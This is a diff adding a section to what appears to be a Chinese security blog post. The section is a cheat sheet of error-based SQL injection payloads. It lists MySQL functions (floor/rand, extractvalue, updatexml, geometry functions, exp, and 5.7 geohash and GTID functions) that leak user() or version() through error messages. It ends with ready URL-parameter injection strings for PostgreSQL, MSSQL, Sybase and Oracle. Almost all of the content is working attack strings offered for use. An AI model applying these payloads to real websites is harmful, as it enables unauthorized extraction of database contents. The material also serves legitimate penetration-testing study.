@@ -7,6 +7,88 @@ categories:
 abbrlink: 41083
 date: 2018-03-21 09:26:16
 ---
+# 报错注入函数
+
+1. floor报错, Mysql5.0及以上版本都能用的报错函数：floor
+
+   > select * from test where id=1 and (select 1 from (select count(\*),concat(user(),floor(rand(0)\*2))x from information_schema.tables group by x)a);
+
+2. MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数
+
+* ExtractValue()
+
+  > select \* from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+
+* UpdateXML()
+
+  > select \* from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));
+  >
+  > ps: updatexml报错函数的结果有32位的长度限制
+
+3. 一些函数在Mysql 5.0.中存在但是不会报错,5.1后才可以报错
+
+* geometrycollection()
+
+  > select \* from test where id=1 and geometrycollection((select \* from(select \* from(select user())a)b));
+
+* multipoint()
+
+  > select \* from test where id=1 and multipoint((select \* from(select \* from(select user())a)b));
+
+* polygon()
+
+  > select \* from test where id=1 and polygon((select \* from(select \* from(select user())a)b));
+
+* multipolygon()
+
+  > select \* from test where id=1 and multipolygon((select \* from(select \* from(select user())a)b));
+
+* linestring()
+
+  > select \* from test where id=1 and linestring((select \* from(select \* from(select user())a)b));
+
+* multilinestring()
+
+  > select \* from test where id=1 and multilinestring((select \* from(select \* from(select user())a)b));
+
+* exp()
+
+  > select \* from test where id=1 and exp(~(select \* from(select user())a));
+
+4. 在MySQL5.7中多了很多能报错的函数
+
+* ST_LatFromGeoHash()
+
+  > select ST_LatFromGeoHash(version());
+
+* ST_LongFromGeoHash()
+
+  >  select ST_LongFromGeoHash(version());
+
+* GTID_SUBSET()
+
+  > select GTID_SUBSET(version());
+  >
+  > ps: 报错信息有长度限制140
+
+* GTID_SUBTRACT()
+
+  > select GTID_SUBTRACT(version());
+
+* ST_PointFromGeoHash()
+
+  >  select ST_PointFromGeoHash(version());
+
+5. 其他数据库中也可以使用不同的方法构成报错：
+
+```
+PostgreSQL: /?param=1 and(1)=cast(version() as numeric)-- 
+MSSQL: /?param=1 and(1)=convert(int,@@version)-- 
+Sybase: /?param=1 and(1)=convert(int,@@version)-- 
+Oracle >=9.0: /?param=1 and(1)=(select upper(XMLType(chr(60)||chr(58)||chr(58)||(select 
+replace(banner,chr(32),chr(58)) from sys.v_$version where rownum=1)||chr(62))) from dual)--
+```
+
 # 通用注入语句:
 
 - 表名
